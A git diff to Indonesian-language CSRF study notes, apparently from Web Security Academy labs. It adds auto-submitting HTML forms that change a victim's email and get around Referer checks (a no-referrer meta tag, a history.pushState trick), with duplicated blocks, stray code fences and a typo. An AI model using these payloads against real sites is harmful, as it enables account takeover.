@@ -93,7 +93,38 @@ Cross Site Request Forgery adalah serangan yang memaksa pengguna agar backend me
   </script>
 
   ```
-
+- Bypass Referrer
+  ```
+  <meta name=”referrer” content=”no-referrer”>
+    <form method="POST"  action="https://acd61f551e096953c052568a003100c3.web-security-academy.net/my-account/change-email">
+  <input type="hidden" name="email" value="acun@hacker.site">
+  </form>  
+  <script>
+    document.forms[0].submit();
+  </script>
+  ```
+  
+  ```
+    ```
+  <meta name=”referrer” content=”no-referrer”>
+    <form method="POST"  action="https://acd61f551e096953c052568a003100c3.web-security-academy.net/my-account/change-email">
+  <input type="hidden" name="email" value="acun@hacker.site">
+  </form>  
+  <script>
+    document.forms[0].submit();
+  </script>
+  ```
+  tambahkan 'eferrer-Policy: unsafe-url" pada repeater
+  
+  <form method="POST"  action="https://acd61f551e096953c052568a003100c3.web-security-academy.net/my-account/change-email">
+    <input type="hidden" name="email" value="acun@hacker.site">
+  </form>  
+  <script>
+    document.forms[0].submit();
+    history.pushState("", "", "/?ac6e1f5a1e29fc3dc04ec83d00c30066.web-security-academy.net");
+  </script>
+  ```
+  
 ## PREVENTION
 - CSRF Token
   - CSRF token should be generated on the server-side
